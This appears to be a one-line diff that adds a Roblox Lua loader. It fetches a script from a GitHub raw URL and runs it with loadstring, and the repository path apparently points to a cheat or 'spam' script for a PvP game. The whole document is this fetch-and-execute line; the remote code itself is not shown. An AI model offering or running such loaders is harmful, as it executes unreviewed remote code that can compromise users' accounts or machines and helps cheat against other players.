@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/rofront-world-pvp-spam3-w2t0un00mc8ll4.lua"))()
